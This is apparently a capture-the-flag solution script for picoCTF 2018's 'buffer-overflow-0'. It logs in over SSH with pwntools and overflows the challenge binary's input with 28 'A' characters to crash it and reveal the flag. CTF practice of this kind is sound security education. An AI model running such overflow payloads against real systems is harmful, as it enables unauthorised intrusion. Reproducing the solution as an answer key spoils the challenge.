#!/usr/bin/python
from pwn import *

USER = 'Platy' # Change username accordingly.

s = ssh(host='2018shell1.picoctf.com', user=USER) # Make sure ssh-keyz challenge is done first

exploit = 'A' * 28

py = s.run('cd /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d; ./vuln {}'.format(exploit))
print py.recv()
s.close()
